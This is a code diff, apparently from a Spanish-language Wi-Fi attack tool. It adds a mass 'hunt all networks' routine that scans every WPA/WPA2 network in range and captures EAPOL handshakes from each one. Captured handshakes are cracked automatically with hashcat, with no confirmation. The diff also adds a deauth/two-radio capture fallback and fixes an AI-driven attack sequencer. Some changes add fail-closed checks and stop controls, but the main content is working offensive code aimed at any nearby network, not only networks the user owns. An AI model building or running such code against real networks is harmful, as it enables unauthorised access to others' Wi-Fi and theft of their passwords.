@@ -221,12 +221,37 @@ window.selectNetwork = function (bssid, ssid, signal, channel, security) {
   profileTarget(bssid);
   renderTargetBar();
   if (window.setIaStatus) window.setIaStatus('Objetivo seleccionado: ' + (ssid||'red') + ' · CH ' + (channel||'?') + '. Listo para atacar.');
-  window.checkPmfGate(bssid, channel).then((ok) => {
-    if (!ok) return;
+  window.checkPmfGate(bssid, channel).then(async (ok) => {
     const prev = window._hunterTarget;
-    if (window._hunterActive && prev && String(prev.bssid).toUpperCase() !== String(bssid).toUpperCase()) {
-      log('[cazador] objetivo cambiado a ' + bssid + ': reiniciando caza.', 'info');
-      stopHunter('cambio de objetivo');
+    const changed = !prev || String(prev.bssid).toUpperCase() !== String(bssid).toUpperCase();
+    if (!ok) {
+      // Fail-closed: el objetivo NUEVO no se confirma (sin beacons / PMF).
+      // NO se cambia el foco: el cazador sigue (o se reanuda) sobre la última
+      // red válida, que es la que el usuario había elegido antes.
+      log('[cazador] ' + bssid + ' no confirmado (fail-closed): se mantiene el objetivo anterior' +
+          (prev && prev.bssid ? ' ' + prev.bssid : '(ninguno)') + '.', 'warn');
+      if (!window._hunterActive && !window._hunterPaused && prev && prev.bssid) {
+        startHunter(prev.bssid, prev.ssid || '', prev.channel || 0);
+      }
+      return;
+    }
+    // E0-29 bis (usuario): cazador DIRIGIDO — sigue solo a la última red
+    // válida. Al cambiar de objetivo se cortan barrido/auto-crack anteriores.
+    if (changed) {
+      if (window._huntAllRunning) {
+        window._huntAllStop = true;
+        log('[cazador-masivo] parado: cambio de objetivo a ' + bssid + '.', 'info');
+      }
+      if (currentAttackId === 'crack_plan') {
+        log('[cazador] cambio de objetivo: cancelando el auto-crack anterior.', 'info');
+        try { await window.__invoke('crack_plan_cancel'); } catch (e) {}
+        if (currentAttackId === 'crack_plan') currentAttackId = null;
+        setAttackRunning(false);
+      }
+      if (window._hunterActive) {
+        log('[cazador] objetivo cambiado a ' + bssid + ': reiniciando caza.', 'info');
+        stopHunter('cambio de objetivo');
+      }
     }
     if (!window._hunterActive && !window._hunterPaused) startHunter(bssid, ssid, channel);
     else if (window._hunterTarget) {
@@ -851,6 +876,44 @@ function resumeHunterIfPaused() {
   log('[cazador] reanudando tras el ataque contra ' + t.bssid + '…', 'info');
   setTimeout(() => startHunter(t.bssid, t.ssid, t.channel), 1200);
 }
+// E0-29 (decisión del usuario): tras capturar un handshake se lanza SOLO el
+// plan de crack acotado (M-10: wordlists/reglas + máscaras ≤10^8), sin
+// confirmación modal. Se registra todo en la consola y Detener lo corta.
+async function autoCrackHandshake(hashFile, ssid, bssid) {
+  if (!hashFile) return null;
+  log('[auto-crack] plan acotado sobre ' + hashFile, 'info');
+  currentAttackId = 'crack_plan';
+  setAttackRunning(true, 'Auto-crack (plan acotado)…');
+  armAttackWatchdog();
+  try {
+    const r = await window.__invoke('crack_plan_run_bg', {
+      hashFile, ssid: ssid || '', bssid: bssid || '', externalGenerator: null,
+    });
+    // Techo de 5 min por handshake: una pasada masiva no puede quedarse
+    // horas en un solo AP. Si se agota, se cancela el plan de verdad.
+    const done = await waitForAttack('crack_plan', 5 * 60 * 1000);
+    if (done && done.timeout) {
+      try { await window.__invoke('crack_plan_cancel'); } catch (e) {}
+      log('[auto-crack] plan cortado tras 5 min (límite de la pasada automática).', 'warn');
+      return null;
+    }
+    const p = (done && done.p) || {};
+    if (p.success) {
+      const m = String(p.stdout || '').match(/CRACKED:\s*([^\r\n]+)/);
+      log('[auto-crack] ✅ CONTRASEÑA ENCONTRADA: ' + (m ? m[1].trim() : 'ver .cracked'), 'ok');
+    } else {
+      log('[auto-crack] plan terminado sin clave (' + ((r && r.stages) || 0) + ' etapas).', 'warn');
+    }
+    return p;
+  } catch (e) { log('[auto-crack] ' + e, 'error'); return null; }
+  finally {
+    if (currentAttackId === 'crack_plan') currentAttackId = null;
+    setAttackRunning(false);
+  }
+}
+
+window.autoCrackHandshake = autoCrackHandshake; // accesible desde la consola/diagnóstico
+
 function startHunter(bssid, ssid, channel) {
   if (!bssid) { log('[cazador] sin objetivo: no arranca.', 'warn'); return; }
   if (attackIsBusy() || window._simpleOrchestrating) {
@@ -893,26 +956,100 @@ async function hunterCycle() {
       log('[cazador] ⚡ HANDSHAKE CAPTURADO: ' + r.output_file + ' (' + r.hashes + ' hashes) · pcapng ' + r.pcapng, 'ok');
       hunterStatus('⚡ capturado');
       stopHunter('material capturado');
+      await autoCrackHandshake(r.output_file, t.ssid, t.bssid);
       return;
     }
     if (window._hunterPaused) log('[cazador] ciclo ' + cy + ' abortado por inicio de ataque (pausa).', 'info');
     else if (window._hunterStopRequested) log('[cazador] ciclo ' + cy + ' abortado por Detener.', 'warn');
     else log('[cazador] ciclo ' + cy + ' sin material' + (r && r.message ? ' · ' + String(r.message).slice(0, 120) : '') + '.', 'warn');
   } catch (e) {
-    log('[cazador] error en ciclo ' + cy + ': ' + e, 'error');
+    const em = String(e);
+    // M-08c: si el RT3070 sigue en netr28ux, el deauth por WinUSB es
+    // imposible. En vez de repetir 20 ciclos inútiles, usar la vía YA
+    // verificada de dos radios: RT73 en monitor + cliente falso netr28ux.
+    if (/netr28ux|WinUSB|Operation not supported/i.test(em) && t.ssid) {
+      log('[cazador] RT3070 sin WinUSB: cambio al gatillo de dos radios (RT73 monitor + cliente netr28ux).', 'warn');
+      try {
+        const g = await window.iaTriggerHandshake({ bssid: t.bssid, ssid: t.ssid, channel: t.channel });
+        if (g && g.success && Number(g.hashes || 0) > 0) {
+          log('[cazador] ⚡ HANDSHAKE CAPTURADO por gatillo: ' + g.output_file + ' (' + g.hashes + ' hashes)', 'ok');
+          hunterStatus('⚡ capturado');
+          stopHunter('material capturado');
+          await autoCrackHandshake(g.output_file, t.ssid, t.bssid);
+          return;
+        }
+        log('[cazador] gatillo sin material: ' + ((g && g.message) || '?'), 'warn');
+      } catch (ge) { log('[cazador] gatillo falló: ' + ge, 'error'); }
+    } else {
+      log('[cazador] error en ciclo ' + cy + ': ' + em, 'error');
+    }
   } finally {
     window._hunterRunning = false;
   }
   if (window._hunterActive) window._hunterTimer = setTimeout(hunterCycle, 15000);
 }
 window.maybeAutoHunter = function () {
-  if (window._hunterActive) return;
-  let t = null;
-  try { t = JSON.parse(localStorage.getItem(HUNTER_KEY) || 'null'); } catch {}
-  if (!t || !t.bssid) return;
-  const n = lastNets.find(x => (x.bssid || '').toUpperCase() === String(t.bssid).toUpperCase());
-  log('[cazador] objetivo guardado ' + t.bssid + ' — reanudando caza automática.', 'info');
-  startHunter(t.bssid, t.ssid || (n && n.ssid) || '', t.channel || (n && n.channel) || 0);
+  // M-09 (decisión del usuario 2026-11-23): NO reanudar la caza al abrir la
+  // app ni tras reiniciar Windows. Se conserva el nombre de la función para
+  // no romper el cableado/auditoría, pero ahora SOLO limpia el objetivo
+  // persistido. La caza arranca únicamente cuando el usuario selecciona red.
+  try { localStorage.removeItem(HUNTER_KEY); } catch {}
+  if (window._hunterActive) stopHunter('arranque sin reanudación automática');
+  log('[cazador] auto-reanudación DESACTIVADA: selecciona una red para empezar a cazar.', 'info');
+};
+// Al cerrar la app tampoco debe quedar un objetivo pendiente para el próximo
+// arranque (ni caza en segundo plano esperando un reinicio).
+window.addEventListener('beforeunload', function () {
+  try { localStorage.removeItem(HUNTER_KEY); } catch {}
+  try { if (typeof stopHunter === 'function') stopHunter('cierre de la app'); } catch {}
+});
+
+// E0-29: caza masiva DINÁMICA. Los objetivos NO son una lista fija: salen del
+// scan_wifi real, así que funciona con cualquier red presente en el entorno.
+window.huntAllNetworks = async function () {
+  if (window._huntAllRunning) { log('[cazador-masivo] ya hay una pasada en curso.', 'warn'); return { ok: false }; }
+  if (attackIsBusy() || window._simpleOrchestrating) {
+    log('[cazador-masivo] hay un ataque en curso; se omite para no solapar TX.', 'warn');
+    return { ok: false };
+  }
+  window._huntAllRunning = true;
+  window._huntAllStop = false;
+  try {
+    const rep = await window.__invoke('detect_adapters');
+    const ad = ((rep && rep.adapters) || []).find(a => a && a.guid && (a.monitor_active || a.monitor_capable));
+    if (!ad) throw new Error('sin adaptador con modo monitor');
+    const scan = await window.__invoke('scan_wifi');
+    const all = ((scan && scan.networks) || []).filter(n => n && n.bssid && /WPA2|WPA/i.test(n.security || '') && Number(n.channel) > 0);
+    log('[cazador-masivo] ' + all.length + ' redes WPA2 del scan (cualquier red, sin lista fija).', 'info');
+    let ok = 0, fail = 0;
+    for (let i = 0; i < all.length; i++) {
+      if (window._huntAllStop || window._simpleStop) { log('[cazador-masivo] detenido por el usuario.', 'warn'); break; }
+      const n = all[i];
+      try {
+        await window.__invoke('activate_monitor', { ifaceGuid: ad.guid, channel: n.channel });
+        await window.__invoke('set_monitor_channel', { ifaceGuid: ad.guid, channel: n.channel });
+        const pr = await window.__invoke('wifi_probe_trigger', { ssid: n.ssid, bssid: n.bssid, channel: n.channel, durationSecs: 15 });
+        if (!(pr && pr.success && pr.output_file)) {
+          fail++;
+          log('[cazador-masivo] ' + (i + 1) + '/' + all.length + ' ' + n.ssid + ': sin EAPOL (' + String(pr && pr.message || '?').slice(0, 80) + ')', 'warn');
+          continue;
+        }
+        const cv = await window.__invoke('convert_ethernet_eapol', { pcapPath: pr.output_file, ssid: n.ssid, bssid: n.bssid });
+        const hashes = parseInt(cv && cv.hashes || 0) || 0;
+        if (hashes > 0) {
+          ok++;
+          log('[cazador-masivo] ⚡ ' + n.ssid + ': ' + hashes + ' hash(es) → ' + cv.output_file, 'ok');
+          await autoCrackHandshake(cv.output_file, n.ssid, n.bssid);
+        } else {
+          fail++;
+          log('[cazador-masivo] ' + n.ssid + ': EAPOL sin hash válido.', 'warn');
+        }
+      } catch (e) { fail++; log('[cazador-masivo] ' + n.ssid + ': ' + e, 'error'); }
+    }
+    try { await window.__invoke('restore_managed', { ifaceGuid: ad.guid }); } catch (e) {}
+    log('[cazador-masivo] FIN: ' + ok + ' con material, ' + fail + ' sin material. Radio en managed.', 'info');
+    return { ok: true, captured: ok, failed: fail, total: all.length };
+  } finally { window._huntAllRunning = false; }
 };
 
 // Devolver la radio a managed al terminar un ataque (si quedó en monitor).
@@ -1431,7 +1568,7 @@ window.iaAttack = async function () {
 
     // La IA inventa rutas de marcador de posición (`/path/to/...`, `LAB.pcap`).
     // Se sustituyen por los archivos REALES producidos por cada paso anterior.
-    const ctxPaths = { pcap: null, hash: null };
+    const ctxPaths = { pcap: null, hash: null, hashOk: false };
     // El modelo deja marcadores (`?`, GUID vacío) en pasos posteriores. Se
     // rellenan con los datos REALES del contexto antes de validar; es enlace
     // de contexto, no una decisión del ataque.
@@ -1464,6 +1601,13 @@ window.iaAttack = async function () {
       if ((name === 'inspect_hash' || name === 'crack_hash') && !ctxPaths.hash &&
           /path\/to|placeholder|SAMPLE/i.test(String(args.hash_path || args.hash_file || ''))) {
         log(`[IA] Paso ${i + 1}/${total} omitido (${name}): no hay .22000 real; el ataque no generó material.`, 'warn');
+        continue;
+      }
+      // M-08a: un .22000 con 0 hashes NO es material crackeable. convert_pcap
+      // escribe el fichero aunque no encuentre PMKID/EAPOL (hash_count=0), y
+      // antes esto lanzaba 8 etapas de hashcat contra un fichero vacío.
+      if ((name === 'inspect_hash' || name === 'crack_hash') && ctxPaths.hash && !ctxPaths.hashOk) {
+        log(`[IA] Paso ${i + 1}/${total} omitido (${name}): la conversión dio 0 hashes; no se inspecciona/crackea un .22000 vacío.`, 'warn');
         continue;
       }
       // El auto-gatillo tiene veredicto negativo medido en este HW: omitirlo.
@@ -1524,12 +1668,20 @@ window.iaAttack = async function () {
       }
       okCount++;
       log(`[IA] ${name} → ${JSON.stringify(result).slice(0, 400)}`, 'ok');
-      if (name === 'deauth_burst' && result && /\.22000$/i.test(result.output_file || '')) ctxPaths.hash = result.output_file;
+      if (name === 'deauth_burst' && result && /\.22000$/i.test(result.output_file || '')) {
+        ctxPaths.hash = result.output_file;
+        ctxPaths.hashOk = Number(result.hash_count || 0) > 0 || result.eapol === true;
+      }
       const outFile = result && result.output_file;
       if (typeof outFile === 'string' && outFile) {
-        if (/\.22000$/i.test(outFile)) ctxPaths.hash = outFile;
+        if (/\.22000$/i.test(outFile)) {
+          ctxPaths.hash = outFile;
+          if (Number(result && result.hash_count || 0) > 0) ctxPaths.hashOk = true;
+          else log(`[IA] convert_pcap/devolvió ${Number(result && result.hash_count || 0)} hashes: sin material para crack.`, 'warn');
+        }
         else if (/\.pcap(ng)?$/i.test(outFile)) ctxPaths.pcap = outFile;
       }
+      if (name === 'inspect_hash' && Number(result && result.total || 0) > 0) ctxPaths.hashOk = true;
       if (name === 'detect_adapters' && result && Array.isArray(result.adapters)) {
         const ad = result.adapters.find(a => a && a.guid);
         if (ad) ctx.guid = ad.guid;
@@ -1595,6 +1747,15 @@ window.iaDeauthBurst = async function (args) {
     const sc = await window.__invoke('set_monitor_channel', { ifaceGuid: ad.guid, channel: ch });
     if (!(sc && sc.success)) log('[deauth] aviso: no se pudo fijar el canal del monitor: ' + ((sc && sc.message) || '?'), 'warn');
   } catch (e) { log('[deauth] aviso set_monitor_channel: ' + e, 'warn'); }
+  // M-08c: el preflight de canal asume WinUSB. Si el RT3070 sigue reclamado
+  // por netr28ux (experimento de dos radios), rt3070_chan_preflight devuelve
+  // "open: Operation not supported" — dar la causa real y la salida, sin
+  // cambiar el driver automáticamente (regla dura del proyecto).
+  const ust = await window.__invoke('usb_raw_status').catch(e => ({ success: false, message: String(e) }));
+  if (!(ust && ust.success)) {
+    throw new Error('RT3070 no accesible por WinUSB (' + ((ust && ust.message) || '?') +
+      '). Para deauth revierte a WinUSB con revert_winusb.ps1 (UAC); con dos radios usa el auto-gatillo (trigger_handshake).');
+  }
   // Read-back del TX: abortar si el RT3070 no está en el canal del monitor.
   const pf = await window.__invoke('usb_raw_tx_preflight', { channel: ch, monitor_channel: monCh });
   if (!(pf && pf.ok)) throw new Error((pf && pf.message) || 'preflight TX falló');
@@ -2945,6 +3106,7 @@ window.simplePwnagotchiKit = async function () {
 };
 
 window.simpleStop = async function () {
+  window._huntAllStop = true; // E0-29: corta también la caza masiva
   stopHunter('Detener');
   window.setIaStatus('IA: deteniendo…');
   window._simpleStop = true;
@@ -3507,6 +3669,9 @@ listen('attack-stage', (event) => {
     updateProgress(Math.min(95, Math.round((d.index / Math.max(1, d.total)) * 100)), txt);
     const st = $('simple-stage'); if (st) st.textContent = txt;
     const lbl = $('attack-status-label'); if (lbl) lbl.textContent = txt + ' · ⏱ ' + fmtElapsed(Date.now() - _attackStartTs);
+    // M-10: una etapa larga de hashcat no debe soltar el lock; mientras haya
+    // señales reales del backend se rearma el watchdog.
+    if (_attackBusy) armAttackWatchdog();
   } catch {}
 });
 
@@ -3516,6 +3681,9 @@ listen('attack-progress', (event) => {
   const isSync = id === 'sync' && !currentAttackId;
   const orchAllow = window._simpleOrchestrating && (id === 'crack_plan' || id === 'simple_attack');
   if (id !== currentAttackId && !isSync && !orchAllow) return;
+  // M-10: rearmar mientras hashcat siga emitiendo salida (etapas de 10-30 min
+  // liberaban el lock a los 10 min aunque el proceso seguía corriendo).
+  if (_attackBusy && (id === 'crack_plan' || id === 'simple_attack')) armAttackWatchdog();
   if (isSync) {
     // Solo la primera vez: showProgress(true) reinicia el panel de salida viva.
     const pc = $('progress-container');
